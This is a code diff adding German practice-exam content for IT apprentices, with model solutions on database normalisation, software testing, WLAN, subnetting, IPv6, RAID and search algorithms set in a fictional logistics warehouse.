+          {t: '**Schritt 2, 1:n-Beziehungen:** Der Primärschlüssel der 1-Seite wandert als **Fremdschlüssel auf die n-Seite**: sendung bekommt kundennr, tour bekommt personalnr.', b: [['table', ['Beziehung', 'Regel', 'Ergebnis'], [['Kunde 1:n Sendung', 'FK auf n-Seite', 'sendung.kundennr'], ['Fahrer 1:n Tour', 'FK auf n-Seite', 'tour.personalnr']]]]},
+          {t: '**Schritt 3, m:n-Beziehung:** wird zu einer **eigenen Tabelle**. Ihr Primärschlüssel besteht aus beiden Fremdschlüsseln; das Beziehungsattribut stoppnr kommt mit.', b: [['diagram', {w: 820, h: 300, keep: 680, cap: 'Relationenmodell (PK = Primärschlüssel, FK = Fremdschlüssel)', nodes: [
+            {id: 'k', k: 'cls', x: 100, y: 75, w: 170, t: {name: 'kunde', attrs: ['PK kundennr', 'firma', 'ort']}}, {id: 's', k: 'cls', x: 330, y: 75, w: 180, t: {name: 'sendung', attrs: ['PK sendungsnr', 'gewicht', 'status', 'FK kundennr']}},
+            {id: 'ts', k: 'cls', x: 560, y: 75, w: 190, s: 'accent', t: {name: 'tour_sendung', attrs: ['PK, FK tournr', 'PK, FK sendungsnr', 'stoppnr']}},
+            {id: 't', k: 'cls', x: 560, y: 235, w: 190, t: {name: 'tour', attrs: ['PK tournr', 'datum', 'kennzeichen', 'FK personalnr']}}, {id: 'f', k: 'cls', x: 300, y: 235, w: 170, t: {name: 'fahrer', attrs: ['PK personalnr', 'name']}},
+          ], edges: [{a: 's', b: 'k', ea: 'none', sa: 'many', tb: '', ta: ''}, {a: 'ts', b: 's', ea: 'none', sa: 'many'}, {a: 'ts', b: 't', ea: 'none', sa: 'many'}, {a: 't', b: 'f', ea: 'none', sa: 'many'}]}]]},
+        ]}]],
+        see: ['ps-er', 'ps-relational', 'ps-ermrm']},
+      {pts: 7, rows: 8, topic: 'Normalisierung', q: 'Die bisherige Access-Datenbank enthält die Tabelle in Anlage 3. a) Nennen Sie zwei Anomalien, die bei dieser Tabelle auftreten können. b) Überführen Sie die Tabelle schrittweise in die dritte Normalform.',
+        ctx: [['h3', 'Anlage 3: Tabelle Tourliste'], ['table', ['TourNr', 'Datum', 'Kennzeichen', 'FahrerNr', 'Fahrer', 'Sendungen (Nr: Kunde, Ort)'], [['T100', '03.03.2026', 'HB-NL 401', 'F7', 'Jana Wiese', 'S501: Hansa Kaffee, Bremen; S502: Fisch & Co., Bremerhaven'], ['T101', '03.03.2026', 'HB-NL 388', 'F2', 'Tom Kruse', 'S503: Hansa Kaffee, Bremen'], ['T102', '04.03.2026', 'HB-NL 401', 'F7', 'Jana Wiese', 'S502: Fisch & Co., Bremerhaven; S504: Weser Möbel, Verden']]]],
+        a: ['a) **Änderungsanomalie:** Zieht Hansa Kaffee um, muss der Ort in vielen Zeilen geändert werden, sonst widersprechen sich die Daten. **Einfügeanomalie:** Ein neuer Fahrer ohne Tour kann nicht erfasst werden. **Löschanomalie:** Wird Tour T101 gelöscht, geht die Information über Tom Kruse verloren.', 'b) Ergebnis in 3NF:', '- **fahrer** (PK fahrernr, name)', '- **tour** (PK tournr, datum, kennzeichen, FK fahrernr)', '- **kunde** (PK kundennr, name, ort)', '- **sendung** (PK sendungsnr, FK kundennr)', '- **tour_sendung** (PK/FK tournr, PK/FK sendungsnr)', 'Bewertung: Anomalien 2 P, 1NF 1 P, 2NF 2 P, 3NF 2 P.'],
+        sol: [['walk', {t: 'Normalisierung der Tourliste', steps: [
+          {t: '**1. Normalform:** Alle Attributwerte sind **atomar**. Die Liste in "Sendungen" wird aufgelöst: eine Zeile je Tour und Sendung, Kunde und Ort werden eigene Spalten. Schlüssel: (TourNr, SendungNr).', b: [['table', ['TourNr', 'SendungNr', 'Datum', 'Kennzeichen', 'FahrerNr', 'Fahrer', 'Kunde', 'Ort'], [['T100', 'S501', '03.03.2026', 'HB-NL 401', 'F7', 'Jana Wiese', 'Hansa Kaffee', 'Bremen'], ['T100', 'S502', '03.03.2026', 'HB-NL 401', 'F7', 'Jana Wiese', 'Fisch & Co.', 'Bremerhaven'], ['T101', 'S503', '03.03.2026', 'HB-NL 388', 'F2', 'Tom Kruse', 'Hansa Kaffee', 'Bremen'], ['T102', 'S502', '04.03.2026', 'HB-NL 401', 'F7', 'Jana Wiese', 'Fisch & Co.', 'Bremerhaven'], ['T102', 'S504', '04.03.2026', 'HB-NL 401', 'F7', 'Jana Wiese', 'Weser Möbel', 'Verden']]]]},
+          {t: '**2. Normalform:** Kein Nichtschlüsselattribut hängt nur von **einem Teil** des zusammengesetzten Schlüssels ab. Datum, Kennzeichen, Fahrer hängen nur an TourNr; Kunde und Ort nur an SendungNr. Also abspalten.', b: [['row', [['table', ['tour: TourNr', 'Datum', 'Kennz.', 'FahrerNr', 'Fahrer'], [['T100', '03.03.', 'HB-NL 401', 'F7', 'Jana Wiese'], ['T101', '03.03.', 'HB-NL 388', 'F2', 'Tom Kruse'], ['T102', '04.03.', 'HB-NL 401', 'F7', 'Jana Wiese']]], ['table', ['sendung: SendungNr', 'Kunde', 'Ort'], [['S501', 'Hansa Kaffee', 'Bremen'], ['S502', 'Fisch & Co.', 'Bremerhaven'], ['S503', 'Hansa Kaffee', 'Bremen'], ['S504', 'Weser Möbel', 'Verden']]], ['table', ['tour_sendung: TourNr', 'SendungNr'], [['T100', 'S501'], ['T100', 'S502'], ['T101', 'S503'], ['T102', 'S502'], ['T102', 'S504']]]]]]},
+          {t: '**3. Normalform:** Keine **transitiven Abhängigkeiten** (Nichtschlüssel hängt von Nichtschlüssel ab). In tour gilt TourNr → FahrerNr → Fahrer, in sendung SendungNr → Kunde → Ort. Fahrer und Kunde werden eigene Tabellen; für Kunden wird ein künstlicher Schlüssel eingeführt.', b: [['row', [['table', ['fahrer: FahrerNr', 'Name'], [['F7', 'Jana Wiese'], ['F2', 'Tom Kruse']]], ['table', ['kunde: KundenNr', 'Name', 'Ort'], [['K1', 'Hansa Kaffee', 'Bremen'], ['K2', 'Fisch & Co.', 'Bremerhaven'], ['K3', 'Weser Möbel', 'Verden']]], ['table', ['sendung: SendungNr', 'KundenNr'], [['S501', 'K1'], ['S502', 'K2'], ['S503', 'K1'], ['S504', 'K3']]]]]]},
+        ]}], ['merk', 'Merksatz: Jedes Nichtschlüsselattribut hängt vom **Schlüssel** (1NF), vom **ganzen Schlüssel** (2NF) und von **nichts als dem Schlüssel** (3NF) ab.']],
+        see: ['ps-normalisierung']},
+      {pts: 6, topic: 'Äquivalenzklassen', q: 'Beim Wareneingang wird das Palettengewicht in ganzen Kilogramm erfasst. Erlaubt sind 1 bis 1.200 kg; Paletten **über 1.000 kg** dürfen nur auf Schwerlastplätze. Bilden Sie die Äquivalenzklassen (gültig und ungültig) und geben Sie mithilfe der Grenzwertanalyse konkrete Testwerte mit erwartetem Ergebnis an.',
+        a: [['table', ['Klasse', 'Bereich', 'Repräsentant', 'Grenzwerte', 'Erwartet'], [['ungültig 1', 'kleiner 1', '-5', '0', 'Fehlermeldung'], ['gültig 1 (normal)', '1 bis 1.000', '500', '1, 1.000', 'Normalplatz'], ['gültig 2 (schwer)', '1.001 bis 1.200', '1.100', '1.001, 1.200', 'Schwerlastplatz'], ['ungültig 2', 'größer 1.200', '1.500', '1.201', 'Fehlermeldung'], ['ungültig 3', 'keine ganze Zahl', '"abc", 12,5', '-', 'Fehlermeldung']]],
+          'Bewertung: Klassen 3 P, Grenzwerte mit erwartetem Ergebnis 3 P.'],
+        sol: [['diagram', {w: 760, h: 120, keep: 600, cap: 'Zahlenstrahl: Klassengrenzen und Testwerte (Grenzwerte jeweils auf beiden Seiten einer Grenze)', nodes: [
+          {id: 'u1', k: 'box', x: 80, y: 50, w: 140, h: 44, t: ['ungültig', '< 1'], s: 'bad'}, {id: 'g1', k: 'box', x: 290, y: 50, w: 260, h: 44, t: ['gültig: Normalplatz', '1 ... 1.000'], s: 'ok'},
+          {id: 'g2', k: 'box', x: 520, y: 50, w: 180, h: 44, t: ['gültig: Schwerlast', '1.001 ... 1.200'], s: 'gold'}, {id: 'u2', k: 'box', x: 690, y: 50, w: 140, h: 44, t: ['ungültig', '> 1.200'], s: 'bad'},
+          {id: 'l', k: 'text', x: 380, y: 102, t: 'Testwerte: 0 | 1 | 1.000 | 1.001 | 1.200 | 1.201', w: 10, h: 10, mw: 700},
+        ], edges: []}]],
+        see: ['eua-testfaelle']},
+      {pts: 4, topic: 'Testarten', q: 'Ordnen Sie den Situationen die passende Testart zu.',
+        match: {keys: ['Regressionstest', 'Lasttest', 'Abnahmetest', 'Integrationstest', 'Smoke-Test'], items: [
+          ['Nach einer Fehlerkorrektur in der Bestandsbuchung werden alle bisherigen Testfälle erneut ausgeführt.', 0],
+          ['Es wird geprüft, ob 60 Scanner gleichzeitig Buchungen absenden können, ohne dass die Antwortzeit über 2 Sekunden steigt.', 1],
+          ['Der Lagerleiter prüft anhand des Pflichtenhefts, ob das System vertragsgemäß ist, und unterschreibt das Protokoll.', 2],
+          ['Backend und ERP-Schnittstelle werden erstmals zusammen getestet.', 3],
+        ]},
+        a: ['- **Regressionstest:** Nach Änderungen sicherstellen, dass bisher Funktionierendes weiter funktioniert.', '- **Lasttest:** Verhalten unter erwarteter (hoher) Last; beim **Stresstest** über die Grenze hinaus.', '- **Abnahmetest:** durch den Auftraggeber, Grundlage für die Abnahme und den Übergang der Gefahr (Werkvertrag).', '- **Integrationstest:** Zusammenspiel von Komponenten bzw. Schnittstellen.', 'Der Smoke-Test (schneller Grundfunktionstest nach dem Deployment) bleibt übrig.'],
+        see: ['ps-testarten']},
+    ],
+  });
+  AP2.exam.part(ID, {
+    t: 'Handlungsschritt 4: Infrastruktur und IT-Sicherheit (25 Punkte)',
+    intro: 'In der Lagerhalle (120 m x 80 m, Stahlregale bis 12 m Höhe) wird ein neues WLAN für die 60 Handscanner aufgebaut. Für Lager, Büro, Scanner, Server, Gäste und Kameras sollen getrennte Netze (VLANs) entstehen.',
+    tasks: [
+      {pts: 6, topic: 'WLAN', q: 'a) Empfehlen Sie einen WLAN-Standard und ein Frequenzband für die Halle und begründen Sie zwei technische Aspekte. b) Die Scanner sollen sich nicht mit einem gemeinsamen Passwort anmelden. Beschreiben Sie das geeignete Verfahren und zwei Vorteile.',
+        a: ['a) **Wi-Fi 6 / 6E (IEEE 802.11ax)**, vorzugsweise **5 GHz** (bzw. 6 GHz): mehr nicht überlappende Kanäle, weniger Störungen als 2,4 GHz; OFDMA für viele gleichzeitige Clients. Wegen der Stahlregale (Dämpfung, Reflexionen) eine **Ausleuchtungsmessung** und **viele Access Points** mit kleiner Sendeleistung; **schnelles Roaming (802.11r/k/v)**, weil sich die Scanner bewegen. 2,4 GHz hat größere Reichweite, aber nur drei überlappungsfreie Kanäle.', 'b) **WPA3-Enterprise mit IEEE 802.1X**: Jedes Gerät authentisiert sich mit Zertifikat oder eigenen Zugangsdaten über **EAP** am **RADIUS-Server**. Vorteile: einzelne Geräte sperrbar (verlorener Scanner), kein Passwort, das alle kennen; Protokollierung (Accounting); dynamische VLAN-Zuweisung.'],
+        sol: [['seq', {w: 720, actors: ['Scanner (Supplicant)', 'Access Point (Authenticator)', 'RADIUS-Server'], cap: '802.1X: Erst nach Access-Accept gibt der Access Point den Zugang frei und weist das Scanner-VLAN zu.', steps: [
+          [0, 1, 'Assoziierung, Port gesperrt', 's'], [1, 0, 'EAP-Request Identity', 'r'], [0, 1, 'EAP-Response (Gerätezertifikat)', 's'], [1, 2, 'RADIUS Access-Request', 's'], [2, 1, 'Access-Accept + VLAN 30', 'r'], [1, 0, 'EAP-Success, Schlüssel ausgehandelt', 'r']]}]],
+        see: ['infra-wlan', 'infra-radius']},
+      {pts: 8, rows: 7, topic: 'Subnetting', q: 'Für die VLANs steht das Netz **172.20.16.0/20** zur Verfügung. Es soll in **8 gleich große Subnetze** geteilt werden. a) Geben Sie Präfixlänge und Subnetzmaske der Subnetze an. b) Wie viele Hosts sind je Subnetz möglich? c) Geben Sie für das **1., 2. und 8. Subnetz** Netzadresse, ersten und letzten Host sowie Broadcast an.',
+        a: ['a) 8 = 2³, also **3 Bits** mehr: **/23**, Maske **255.255.254.0**.', 'b) 32 - 23 = 9 Hostbits: 2⁹ - 2 = **510 Hosts**.', ['table', ['Subnetz', 'Netzadresse', 'erster Host', 'letzter Host', 'Broadcast'], [['1', '172.20.16.0/23', '172.20.16.1', '172.20.17.254', '172.20.17.255'], ['2', '172.20.18.0/23', '172.20.18.1', '172.20.19.254', '172.20.19.255'], ['8', '172.20.30.0/23', '172.20.30.1', '172.20.31.254', '172.20.31.255']]],
+          'Bewertung: a) 2 P, b) 1 P, c) je Subnetz 5/3 P.'],
+        sol: [['walk', {t: 'Subnetting 172.20.16.0/20 in 8 Teile', steps: [
+          {t: '**Bits bestimmen:** 8 Subnetze brauchen 3 zusätzliche Netzbits (2³ = 8). Aus /20 wird **/23**.', b: [['table', ['', '3. Oktett (binär)', '4. Oktett'], [['/20 Maske', '1111 0000', '0000 0000'], ['/23 Maske', '1111 **111**0', '0000 0000'], ['Dezimal', '254', '0']]]]},
+          {t: '**Schrittweite:** Das letzte Netzbit im 3. Oktett hat den Wert 2. Die Subnetze liegen also im Abstand von **2** im dritten Oktett: 16, 18, 20, ... 30.', b: [['table', ['Nr.', 'Netz', 'Bits 3. Oktett'], [['1', '172.20.**16**.0', '0001 **000**0'], ['2', '172.20.**18**.0', '0001 **001**0'], ['3', '172.20.20.0', '0001 010 0'], ['...', '...', '...'], ['8', '172.20.**30**.0', '0001 **111**0']]]]},
+          {t: '**Bereich eines Subnetzes:** Broadcast = nächstes Netz minus 1. Subnetz 1 reicht von 172.20.16.0 bis 172.20.17.255 (zwei volle dritte Oktette = 512 Adressen, davon 510 nutzbar).', b: [['diagram', AP2.dg.flow(['Netz 172.20.16.0', 'Hosts .16.1 bis .17.254', 'Broadcast 172.20.17.255', 'nächstes Netz 172.20.18.0'], {w: 760, h: 100, styles: ['accent', 'ok', 'bad', 'plain'], bw: 170})]]},
+          {t: '**Kontrolle:** Das 8. Subnetz endet mit 172.20.31.255. Das ist genau das Ende von 172.20.16.0/20 (16 + 16 - 1 = 31). Passt.', b: [['tool', 'subnet']]},
+        ]}]],
+        see: ['infra-subnetting']},
+      {pts: 4, topic: 'IPv6', q: 'NordLog erhält vom Provider das Präfix **2001:db8:4a00::/48** und vergibt intern /64-Netze. a) Wie viele /64-Netze sind möglich? b) Geben Sie das dritte /64-Netz an (das erste hat die Subnetz-ID 0). c) Kürzen Sie 2001:0db8:4a00:0000:0000:0000:00a1:0001 normgerecht.',
+        a: ['a) 64 - 48 = 16 Bits: 2¹⁶ = **65.536** Netze.', 'b) Subnetz-IDs 0, 1, 2: das dritte ist **2001:db8:4a00:2::/64**.', 'c) **2001:db8:4a00::a1:1** (führende Nullen je Block weglassen, die längste Nullfolge einmal durch :: ersetzen).'],
+        sol: [['table', ['Bits', '1 bis 48', '49 bis 64', '65 bis 128'], [['Bedeutung', 'Präfix vom Provider: 2001:db8:4a00', 'Subnetz-ID (16 Bit): 0000 bis ffff', 'Interface-ID'], ['3. Netz', '2001:0db8:4a00', '**0002**', '0000:0000:0000:0000']]]],
+        see: ['infra-ipv6', 'infra-ipv6sub']},
+      {pts: 7, topic: 'RAID und Backup', q: 'Der Datenbankserver erhält **6 Festplatten zu je 4 TB**. a) Vergleichen Sie RAID 5 und RAID 10 hinsichtlich Nutzkapazität und Ausfallsicherheit. b) Der Administrator meint, mit RAID sei kein Backup nötig. Widerlegen Sie das und erläutern Sie die 3-2-1-Regel.',
+        a: ['a) **RAID 5:** (6 - 1) x 4 TB = **20 TB** nutzbar, verkraftet den Ausfall **einer** beliebigen Platte (Parität verteilt). Schreiben langsamer (Paritätsberechnung), langer Rebuild mit Risiko.', '**RAID 10:** 6 / 2 x 4 TB = **12 TB** nutzbar, verkraftet mindestens **eine**, im günstigen Fall **bis zu drei** Platten (je eine pro Spiegelpaar). Schnell beim Schreiben, gut für Datenbanken.', 'b) RAID schützt nur vor **Plattenausfall**, nicht vor **Löschen, Ransomware, Softwarefehlern, Diebstahl, Brand**: Fehler werden sofort auf alle Platten gespiegelt. **3-2-1:** mindestens **3 Kopien** der Daten, auf **2 verschiedenen Medientypen**, davon **1 Kopie außer Haus** (offline oder in einer anderen Brandzone, möglichst unveränderlich).'],
+        sol: [['diagram', {w: 760, h: 230, keep: 600, cap: 'RAID 10 mit 6 Platten: drei gespiegelte Paare (RAID 1), darüber Striping (RAID 0)', nodes: [
+          {id: 'g1', k: 'group', x: 140, y: 125, w: 220, h: 170, t: 'Spiegel 1'}, {id: 'g2', k: 'group', x: 380, y: 125, w: 220, h: 170, t: 'Spiegel 2'}, {id: 'g3', k: 'group', x: 620, y: 125, w: 220, h: 170, t: 'Spiegel 3'},
+          {id: 'd1', k: 'cyl', x: 90, y: 140, w: 80, h: 90, t: ['A1', '4 TB'], s: 'accent'}, {id: 'd2', k: 'cyl', x: 190, y: 140, w: 80, h: 90, t: ['A1', 'Kopie'], s: 'soft'},
+          {id: 'd3', k: 'cyl', x: 330, y: 140, w: 80, h: 90, t: ['A2', '4 TB'], s: 'accent'}, {id: 'd4', k: 'cyl', x: 430, y: 140, w: 80, h: 90, t: ['A2', 'Kopie'], s: 'soft'},
+          {id: 'd5', k: 'cyl', x: 570, y: 140, w: 80, h: 90, t: ['A3', '4 TB'], s: 'accent'}, {id: 'd6', k: 'cyl', x: 670, y: 140, w: 80, h: 90, t: ['A3', 'Kopie'], s: 'soft'},
+        ], edges: []}], ['table', ['', 'RAID 5', 'RAID 10'], [['Nutzkapazität', '20 TB (83 %)', '12 TB (50 %)'], ['Ausfälle', 'genau 1', '1 sicher, bis 3 (je Paar 1)'], ['Schreibleistung', 'mittel (Parität)', 'hoch'], ['Rebuild', 'lang, alle Platten belastet', 'kurz, nur Partnerplatte kopieren']]], ['tool', 'raid']],
+        see: ['infra-raid', 'infra-backup']},
+    ],
+  });
+  AP2.exam.end(ID);
+})();
+;
+// content/exam/eua3-1.js
+// Probeprüfung 3, Entwicklung und Umsetzung von Algorithmen: NordLog Spedition GmbH, LagerPilot.
+(function () {
+  const ID = 'exam3-eua';
+  const bars = (vals, mark, cap) => ['chart', {kind: 'bar', w: 640, h: 230, labels: vals.map((v, i) => (i === mark ? '▶ ' : '') + 'Index ' + i), series: [{n: 'Gewicht (kg)', d: vals, k: 'accent'}], vals: true, ymax: 1000, cap}];
+  AP2.page(ID, {b: 'exam', g: 'Probeprüfung 3 (Logistik)', t: 'Entwicklung und Umsetzung von Algorithmen: LagerPilot', blocks: []});
+  AP2.exam.start(ID, {minutes: 90, cover: AP2.exam.COVER.eua,
+    hint: 'Realistischer Aufgabensatz: 4 Handlungsschritte zu je 25 Punkten, 90 Minuten. Programmieraufgaben in Pseudocode oder einer Sprache Ihrer Wahl. Die Musterlösungen zeigen mehrere Sprachen, Struktogramme und Schritt-für-Schritt-Präsentationen.',
+    intro: [
+      ['p', 'Sie entwickeln bei der **CodeHafen Software GmbH** das Lagerverwaltungssystem **LagerPilot** für die **NordLog Spedition GmbH** weiter. Das Lager besteht aus Regalreihen mit Fächern. Im Programm wird ein Regal als **zweidimensionales Feld** abgebildet:'],
+      ['kv', [['regal[r][f]', 'Inhalt von Reihe r, Fach f: **-1** = gesperrt, **0** = frei, **größer 0** = Paletten-ID'], ['traglast[r]', 'maximale Traglast eines Fachs in Reihe r (kg)'], ['Indizes', 'beginnen bei 0; länge(feld) liefert die Anzahl der Elemente']]],
+    ]});
+  AP2.exam.part(ID, {
+    t: 'Handlungsschritt 1: Lagerplätze finden und auswerten (25 Punkte)',
+    tasks: [
+      {pts: 10, rows: 12, topic: 'Algorithmus entwickeln', q: 'Entwickeln Sie die Funktion **findeFreienPlatz(regal, traglast, gewicht)**. Sie durchsucht das Regal reihenweise (Reihe 0 zuerst, darin Fach 0 zuerst) und gibt die Position **[r, f]** des ersten **freien** Fachs zurück, dessen Reihe das **Gewicht tragen** kann. Gibt es keinen passenden Platz, wird **[-1, -1]** zurückgegeben. Ist das Gewicht kleiner oder gleich 0, soll ebenfalls [-1, -1] zurückgegeben werden.',
+        a: ['Kernidee: zwei geschachtelte Schleifen; die Traglast einmal je Reihe prüfen (ganze Reihe überspringen); beim ersten Treffer **sofort zurückgeben**.',
+          ['codes', [['pseudo', `funktion findeFreienPlatz(regal, traglast, gewicht)
+    wenn gewicht <= 0 dann
+        rückgabe [-1, -1]
+    ende wenn
+    für r = 0 bis länge(regal) - 1
+        wenn traglast[r] >= gewicht dann
+            für f = 0 bis länge(regal[r]) - 1
+                wenn regal[r][f] = 0 dann
+                    rückgabe [r, f]
+                ende wenn
+            ende für
+        ende wenn
+    ende für
+    rückgabe [-1, -1]
+ende funktion`], ['java', `static int[] findeFreienPlatz(int[][] regal, int[] traglast, int gewicht) {
+    if (gewicht <= 0) return new int[]{-1, -1};
+    for (int r = 0; r < regal.length; r++) {
+        if (traglast[r] < gewicht) continue;      // Reihe zu schwach
+        for (int f = 0; f < regal[r].length; f++) {
+            if (regal[r][f] == 0) return new int[]{r, f};
+        }
+    }
+    return new int[]{-1, -1};
+}`], ['python', `def finde_freien_platz(regal, traglast, gewicht):
+    if gewicht <= 0:
+        return [-1, -1]
+    for r, reihe in enumerate(regal):
+        if traglast[r] < gewicht:
+            continue
+        for f, inhalt in enumerate(reihe):
+            if inhalt == 0:
+                return [r, f]
+    return [-1, -1]`], ['csharp', `static int[] FindeFreienPlatz(int[][] regal, int[] traglast, int gewicht)
+{
+    if (gewicht <= 0) return new[] { -1, -1 };
+    for (int r = 0; r < regal.Length; r++)
+    {
+        if (traglast[r] < gewicht) continue;
+        for (int f = 0; f < regal[r].Length; f++)
+            if (regal[r][f] == 0) return new[] { r, f };
+    }
+    return new[] { -1, -1 };
+}`]]],
+          'Bewertung: Prüfung gewicht <= 0 (1 P), äußere Schleife (2 P), Traglastprüfung (2 P), innere Schleife (2 P), Prüfung frei und Rückgabe [r, f] (2 P), Rückgabe [-1, -1] am Ende (1 P).'],
+        sol: [['diagram', AP2.dg.nsd([['if', 'gewicht <= 0 ?', [['act', 'rückgabe [-1, -1]']], [
+          ['for', 'für r = 0 bis länge(regal) - 1', [['if', 'traglast[r] >= gewicht ?', [['for', 'für f = 0 bis länge(regal[r]) - 1', [['if', 'regal[r][f] = 0 ?', [['act', 'rückgabe [r, f]']], [['act', '(nichts)']]]]]], [['act', '(Reihe überspringen)']]]]],
+          ['act', 'rückgabe [-1, -1]']]]], {w: 640, cap: 'Dieselbe Lösung als Struktogramm (Nassi-Shneiderman)'})],
+          ['warn', 'Typischer Fehler: [-1, -1] **innerhalb** der Schleife im sonst-Zweig zurückgeben. Dann wird nur das allererste Fach geprüft.']],
+        see: ['eua-algoexam', 'eua-pseudocode', 'ps-struktogramm']},
+      {pts: 6, rows: 8, topic: 'Schreibtischtest', q: 'Gegeben ist die Funktion **auswerten(regal)**. Führen Sie einen Schreibtischtest für regal = [[5, 0, -1, 9], [0, 0, 7, 0], [3, 8, -1, -1]] durch: Notieren Sie nach jedem Durchlauf der äußeren Schleife die Werte von r, belegt, nutzbar, besteQuote und besteReihe. Geben Sie den Rückgabewert an und beschreiben Sie, was die Funktion ermittelt.',
+        ctx: [['code', 'pseudo', `funktion auswerten(regal)
+    besteReihe = -1
+    besteQuote = -1.0
+    für r = 0 bis länge(regal) - 1
+        belegt = 0
+        nutzbar = 0
+        für f = 0 bis länge(regal[r]) - 1
+            wenn regal[r][f] >= 0 dann
+                nutzbar = nutzbar + 1
+                wenn regal[r][f] > 0 dann
+                    belegt = belegt + 1
+                ende wenn
+            ende wenn
+        ende für
+        wenn nutzbar > 0 und belegt / nutzbar > besteQuote dann
+            besteQuote = belegt / nutzbar
+            besteReihe = r
+        ende wenn
+    ende für
+    rückgabe besteReihe
+ende funktion`]],
+        a: [['table', ['nach Durchlauf', 'r', 'belegt', 'nutzbar', 'belegt / nutzbar', 'besteQuote', 'besteReihe'], [['Start', '-', '-', '-', '-', '-1.0', '-1'], ['1', '0', '2', '3', '0,667', '**0,667**', '**0**'], ['2', '1', '1', '4', '0,25', '0,667', '0'], ['3', '2', '2', '2', '1,0', '**1,0**', '**2**']]],
+          'Rückgabewert: **2**. Die Funktion ermittelt die **Reihe mit der höchsten Auslastung** (Anteil belegter Fächer an den nicht gesperrten Fächern). Gesperrte Fächer (-1) zählen nicht mit.', 'Bewertung: Tabelle 4 P, Rückgabe und Zweck 2 P.'],
+        sol: [['walk', {t: 'Schreibtischtest auswerten(regal)', steps: [
+          {t: '**Reihe 0: [5, 0, -1, 9]**. Nicht gesperrt sind 5, 0 und 9 (nutzbar = 3), davon belegt 5 und 9 (belegt = 2). Quote 2/3 = 0,667 > -1, also neue Bestwerte.', b: [['table', ['f', '0', '1', '2', '3'], [['Wert', '5', '0', '-1', '9'], ['nutzbar?', 'ja', 'ja', '**nein**', 'ja'], ['belegt?', 'ja', 'nein', '-', 'ja']]]]},
+          {t: '**Reihe 1: [0, 0, 7, 0]**. Alle 4 nutzbar, nur 7 belegt: 1/4 = 0,25. Nicht größer als 0,667, keine Änderung.', b: [['table', ['f', '0', '1', '2', '3'], [['Wert', '0', '0', '7', '0'], ['nutzbar?', 'ja', 'ja', 'ja', 'ja'], ['belegt?', 'nein', 'nein', 'ja', 'nein']]]]},
+          {t: '**Reihe 2: [3, 8, -1, -1]**. Nutzbar 2, belegt 2: Quote 1,0 > 0,667. besteReihe = 2. Nach der Schleife wird **2** zurückgegeben.', b: [['chart', {kind: 'bar', w: 560, h: 220, labels: ['Reihe 0', 'Reihe 1', 'Reihe 2'], series: [{n: 'Auslastung', d: [0.67, 0.25, 1], k: 'accent'}], vals: true, ymax: 1, cap: 'Auslastung je Reihe: Reihe 2 ist voll belegt'}]]},
+        ]}]],
+        see: ['eua-algoexam', 'eua-debugging']},
+      {pts: 4, topic: 'Datentypen und Laufzeit', q: 'a) Die Funktion auswerten wird in Java umgesetzt; belegt und nutzbar sind vom Typ int. Welches Problem entsteht bei belegt / nutzbar, und wie beheben Sie es? b) Geben Sie die Laufzeitkomplexität von auswerten in O-Notation an (R Reihen, F Fächer je Reihe).',
+        a: ['a) **Ganzzahldivision:** 2 / 3 ergibt in Java **0**, nicht 0,667. Damit wären alle Quoten 0 oder 1 und das Ergebnis falsch. Lösung: vorher in double umwandeln, zum Beispiel **(double) belegt / nutzbar** oder belegt * 1.0 / nutzbar.', 'b) Jedes Fach wird genau einmal betrachtet: **O(R x F)**, also linear in der Anzahl aller Fächer.'],
+        sol: [['codes', [['java', `int belegt = 2, nutzbar = 3;
+System.out.println(belegt / nutzbar);            // 0   (Ganzzahldivision)
+System.out.println((double) belegt / nutzbar);   // 0.6666666666666666`], ['python', `belegt, nutzbar = 2, 3
+print(belegt // nutzbar)   # 0     (Ganzzahldivision)
+print(belegt / nutzbar)    # 0.666...  (in Python ist / immer Gleitkomma)`]]], ['out', `0
+0.6666666666666666`]],
+        see: ['eua-datentypen', 'eua-onotation']},
+      {pts: 5, rows: 9, topic: 'Rekursion', q: 'Die Paletten-IDs eines Lagers liegen **aufsteigend sortiert** in einem Feld ids vor. Schreiben Sie eine **rekursive** Funktion **binSuche(ids, ziel, links, rechts)**, die den Index von ziel zurückgibt oder -1, wenn ziel nicht enthalten ist. Der erste Aufruf lautet binSuche(ids, ziel, 0, länge(ids) - 1).',
+        a: [['codes', [['pseudo', `funktion binSuche(ids, ziel, links, rechts)
+    wenn links > rechts dann
+        rückgabe -1                          // Abbruch: Bereich leer
+    ende wenn
+    mitte = (links + rechts) DIV 2
+    wenn ids[mitte] = ziel dann
+        rückgabe mitte
+    sonst wenn ids[mitte] < ziel dann
+        rückgabe binSuche(ids, ziel, mitte + 1, rechts)
+    sonst
+        rückgabe binSuche(ids, ziel, links, mitte - 1)
+    ende wenn
+ende funktion`], ['java', `static int binSuche(int[] ids, int ziel, int links, int rechts) {
+    if (links > rechts) return -1;
+    int mitte = (links + rechts) / 2;
+    if (ids[mitte] == ziel) return mitte;
+    if (ids[mitte] < ziel) return binSuche(ids, ziel, mitte + 1, rechts);
+    return binSuche(ids, ziel, links, mitte - 1);
+}`], ['python', `def bin_suche(ids, ziel, links, rechts):
+    if links > rechts:
+        return -1
+    mitte = (links + rechts) // 2
+    if ids[mitte] == ziel:
+        return mitte
+    if ids[mitte] < ziel:
+        return bin_suche(ids, ziel, mitte + 1, rechts)
+    return bin_suche(ids, ziel, links, mitte - 1)`]]],
+          'Bewertung: Abbruchbedingung (1 P), Mitte (1 P), Treffer (1 P), zwei rekursive Aufrufe mit richtigen Grenzen (2 P).'],
+        sol: [['walk', {t: 'binSuche([12, 17, 23, 31, 40, 52, 66, 78], 52, 0, 7)', steps: [
+          {t: '**Aufruf 1:** links 0, rechts 7, mitte 3. ids[3] = 31 < 52, also rechts weitersuchen.', b: [['table', ['Index', '0', '1', '2', '3', '4', '5', '6', '7'], [['Wert', '12', '17', '23', '**31**', '40', '52', '66', '78'], ['Bereich', 'x', 'x', 'x', 'mitte', 'x', 'x', 'x', 'x']]]]},
+          {t: '**Aufruf 2:** links 4, rechts 7, mitte 5. ids[5] = 52 = ziel. Rückgabe **5** wird durch alle Aufrufe nach oben gereicht.', b: [['table', ['Index', '4', '5', '6', '7'], [['Wert', '40', '**52**', '66', '78'], ['Bereich', 'x', 'mitte = Treffer', 'x', 'x']]]]},
